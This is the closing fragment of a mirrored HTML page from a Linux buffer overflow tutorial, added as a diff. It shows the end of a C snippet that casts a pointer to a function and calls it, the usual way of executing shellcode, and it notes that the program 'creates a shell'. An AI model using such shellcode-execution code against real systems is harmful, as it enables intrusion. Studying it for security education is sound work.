+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char (*q)();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>q = p;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>q();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>This program works on the
+same principles and creates a shell.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><a href="../../security.html"><b>Back
+to the main page</b></a><span style='font-family:"Trebuchet MS";mso-fareast-font-family:
+"MS Mincho";color:#000066'><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/security/linux/buffoverflowl.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:11 GMT -->
+</html>
